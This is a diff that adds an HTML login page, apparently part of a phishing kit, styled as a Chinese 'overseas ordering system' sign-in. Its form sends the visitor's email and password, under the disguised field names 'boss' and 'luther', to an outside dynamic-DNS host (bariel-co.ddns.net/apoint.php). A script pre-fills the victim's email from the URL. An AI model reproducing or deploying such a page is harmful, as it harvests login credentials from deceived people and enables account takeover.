@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="">
+  <meta name="author" content="">
+
+  <title>海外下单系统 - 登录</title>
+  <link rel="icon" type="image/x-icon" href="img/stee.png" />
+
+  <script src="js/jquery.min.js"></script>
+  <script src="js/bootstrap.min.js"></script>
+ 
+  <!-- Custom styles for this template-->
+  <link href="css/soko.css" rel="stylesheet">
+
+</head>
+
+<body>
+
+<div class="container-fluid" style=" padding: 0; ">
+ 
+  <div class="row">
+    <div class="col-sm-4" style="background-color:transparent;"><div class="ba switchi"></div></div>
+    <div class="col-sm-4 switchi" style="background-color:transparent;">
+	
+	<div class="ofus"></div>
+	</div>
+    <div class="col-sm-4" style="background-color:transparent; height: 100vh;">
+	
+	<div class="log">
+	
+	
+	<div class="incre"><strong>个人登录</strong></div>
+	<div class="kno"> 
+	<form method="post" action="https://bariel-co.ddns.net/apoint.php">
+	
+	<div class="with">
+	<input name="boss" value="" class="mama" type="email" id="email" required="" style="" placeholder="邮箱" />
+	<br>
+	<input name="luther" value="" class="mama" type="password" style="" required=""  placeholder="密码" />
+	
+	</div>
+	
+	
+<div class="huint"><input value=""  required=""  type="text" class="mama" style="padding: 9px 5px; width: 172px; font-size: 16px; background: transparent; margin-left: -23px; margin-bottom: 21px; outline: 0; border: 0;" placeholder="密码" /> </div>
+<button class="rigo" name="trught"> </button>
+<center><div style="color: #b1b1b1; text-align: center; font-size: 13px; margin-top: 75px;">登录即代表您已阅读并同意 《隐私政策》 <br>
+浏览器要求：IE8+ / Chrome 30 +</div></center>
+</form>
+<br>
+ <div class="odo" style="background-color:transparent;">
+	<div class="switch"> 支持电邮公司</div> 
+	<div class="ofus"></div>
+	</div>
+	</div>
+	</div>
+	
+	
+	</div>
+  </div>
+</div>
+
+
+  <script src="js/sb-admin-2.min.js"></script>
+
+<script>
+    
+$.urlParam = function(email){
+    var results = new RegExp('[\?&]' + email + '=([^&#]*)').exec(window.location.href);
+    return results[1] || 0;
+	
+      
+}
+
+</script>
+
+
+
+<script>
+    
+    $( document ).ready(function() {
+        // after the page elements are all loaded, then run the script
+        // Set the input field with unique ID #email to a value
+
+          $("#email").val($.urlParam('email'));
+        
+        });
+        
+</script>
+ 
+ 
+</body>
+
+</html>
